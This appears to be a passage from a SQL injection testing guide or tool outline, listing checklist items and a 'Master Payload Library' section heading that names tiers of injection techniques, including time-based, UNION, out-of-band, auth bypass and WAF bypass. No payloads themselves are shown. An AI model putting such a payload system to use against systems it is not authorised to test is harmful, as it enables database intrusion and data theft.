- Data proof: extract benign value only
- WAF false error check

### 10. Master Payload Library
12-tier payload system from initial probes through DBMS fingerprint, boolean, time-based, error-based, UNION, OOB, auth bypass, second-order, stacked queries, NoSQL, WAF bypass combos
